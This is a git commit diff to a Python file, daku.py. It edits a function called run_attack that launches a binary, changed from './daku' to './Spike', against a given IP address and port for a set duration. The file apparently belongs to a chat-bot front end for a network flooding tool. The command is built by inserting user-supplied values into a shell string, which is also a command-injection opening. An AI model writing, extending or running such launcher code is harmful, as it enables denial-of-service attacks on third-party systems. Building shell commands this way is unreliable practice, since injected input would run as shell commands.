e50d6fa49a1bcfd31f1611f22e187f05d7561c44
xdftefgtr <aditya.pubg802@gmail.com>
2025-01-04 14:25:55 +0530

    Update daku.py

--- daku.py
+++ daku.py
@@ -181,7 +181,7 @@ async def run_attack(chat_id, ip, port, duration, context):
     attack_in_progress = True
 
     try:
-        command = f"./daku {ip} {port} {duration} {200} {1000}"
+        command = f"./Spike {ip} {port} {duration} {512} {800}"
         process = await asyncio.create_subprocess_shell(
             command,
             stdout=asyncio.subprocess.PIPE,
